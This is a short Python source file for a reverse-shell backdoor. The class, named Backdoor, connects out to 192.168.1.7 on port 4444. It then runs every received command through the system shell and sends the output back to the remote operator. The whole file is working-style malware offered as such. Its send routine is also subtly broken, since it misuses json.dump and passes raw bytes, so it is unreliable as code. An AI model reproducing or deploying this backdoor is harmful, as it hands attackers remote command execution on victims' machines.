import socket
import subprocess,json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"[+] Connection Successful\n\n")
    
    def safe_send(self, data):
        self.connection.send(json.dump(data))
    
    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode("UTF-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def run_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.safe_receive()
            command_result = self.run_system_commands(command)
            self.safe_send(command_result)

        self.connection.close()

my_backdoor = Backdoor("192.168.1.7", 4444)
my_backdoor.run()